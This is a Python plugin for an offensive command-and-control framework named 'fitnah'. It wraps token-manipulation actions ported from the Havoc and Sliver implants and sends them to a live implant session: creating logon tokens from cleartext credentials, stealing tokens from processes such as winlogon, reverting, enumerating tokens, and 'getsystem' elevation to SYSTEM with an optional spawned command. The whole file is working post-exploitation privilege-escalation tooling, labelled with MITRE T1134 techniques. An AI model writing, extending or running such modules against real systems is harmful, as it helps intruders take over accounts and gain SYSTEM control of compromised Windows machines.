"""
token_impersonate — Token impersonation / make_token / getsystem

Standalone Win32 port of:
  HavocFramework/Havoc payloads/Demon/src/core/Token.c (MIT)
  BishopFox/sliver implant/sliver/priv/priv_windows.go  (MIT)

Exposes five sub-commands:
  make_token  — LogonUser + ImpersonateLoggedOnUser (network-only session)
  steal_token — duplicate token from a running process (default: winlogon)
  rev2self    — revert to process token (NtSetInformationThread + RevertToSelf)
  getsystem   — elevate to NT AUTHORITY\\SYSTEM (CreateProcessWithTokenW)
  token_list  — enumerate all process tokens (JSON)

MITRE: T1134.001 (Token Impersonation/Theft)
       T1134.002 (Create Process with Token)
       T1134.003 (Make and Impersonate Token)
"""

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.context import PluginContext
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class TokenImpersonate(BasePlugin):
    NAME        = "token_impersonate"
    DESCRIPTION = (
        "Token impersonation suite: make_token, steal_token, rev2self, "
        "getsystem, token_list (Havoc/Sliver-derived standalone port)"
    )
    MITRE       = "T1134.001,T1134.002,T1134.003"
    CATEGORY    = "privilege_escalation"

    schema = ParamSchema().add(
        Param("action",   str, required=True,
              help="make_token | steal_token | rev2self | getsystem | token_list"),
        Param("domain",   str, required=False, default=".",
              help="[make_token] NETBIOS domain or '.' for local"),
        Param("username", str, required=False, default="",
              help="[make_token] account name"),
        Param("password", str, required=False, default="",
              help="[make_token] cleartext password"),
        Param("pid",      int, required=False, default=0,
              help="[steal_token] target PID (0 = auto-select SYSTEM process)"),
        Param("cmdline",  str, required=False, default="",
              help="[getsystem] command to spawn as SYSTEM (empty = impersonate only)"),
    )

    def run(self, session, params, ctx: PluginContext = None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "").lower()

        if action == "make_token":
            username = params.get("username", "")
            if not username:
                return ModuleResult.err("username required for make_token")
            r = ctx.send("make_token", {
                "domain":   params.get("domain", "."),
                "username": username,
                "password": params.get("password", ""),
            })
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "make_token failed"))
            return ModuleResult.ok(data=r.get("output", ""))

        elif action == "steal_token":
            pid = int(params.get("pid", 0))
            if not pid:
                return ModuleResult.err("pid required for steal_token")
            r = ctx.send("steal_token", {"pid": pid})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "steal_token failed"))
            return ModuleResult.ok(data=r.get("output", ""))

        elif action == "rev2self":
            r = ctx.send("rev2self", {})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "rev2self failed"))
            return ModuleResult.ok(data=r.get("output", ""))

        elif action == "getsystem":
            r = ctx.send("getsystem", {"cmdline": params.get("cmdline", "")})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "getsystem failed"))
            return ModuleResult.ok(data=r.get("output", ""))

        elif action == "token_list":
            r = ctx.send("token_list", {})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "token_list failed"))
            return ModuleResult.ok(data=r.get("output", "[]"))

        else:
            return ModuleResult.err(
                f"Unknown action '{action}'. "
                "Choose: make_token, steal_token, rev2self, getsystem, token_list"
            )
